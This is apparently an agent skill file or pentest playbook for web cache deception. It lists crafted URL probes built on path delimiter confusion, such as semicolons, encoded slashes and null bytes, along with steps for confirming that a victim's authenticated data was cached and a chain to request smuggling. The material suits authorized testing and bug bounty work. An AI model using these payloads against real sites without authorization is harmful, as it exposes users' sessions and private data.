---
name: web-cache-deception-path
description: Web cache deception via path delimiter confusion between CDN/cache and origin server. Use when CDN (Cloudflare, Akamai, Fastly, CloudFront) or cache layer detected.
---

# Web Cache Deception (Path Delimiters)

## Pattern
- CDN/cache present: `cf-cache-status`, `x-cache`, `age`, `x-served-by` headers
- Cache rules based on file extension or path prefix
- Origin and cache disagree on URL path parsing/normalization
- Sensitive endpoints return user-specific data (profile, session, tokens)

## Probe
**Path delimiter confusion** — cache sees static file, origin serves dynamic content:
```
/account/settings/anything.css
/api/me/..%2fstatic/x.js
/share/%2F..%2Fapi/auth/session
/profile;/static/img.png
/account/.css
```
**Delimiters to test** (parsed differently by cache vs origin):
- Semicolon: `/account;x.css` | Encoded slash: `%2F..%2F`
- Dot segment: `/api/me/./x.css` | Null byte: `%00.css`
- Fragment-like: `/account%23.css` | Double encoding: `%252e%252e`
Send as victim (authenticated), then fetch same URL unauthenticated. If cached response contains victim's data, WCD confirmed.

## Indicators
- `Cache-Status: HIT` (or `cf-cache-status: HIT`) on crafted URL
- Unauthenticated request returns authenticated user's data from cache
- `Age` header increases on repeated requests (entry is cached)

## Chain With
- te0-request-smuggling (poison cache via smuggled request)

## Reference
https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html
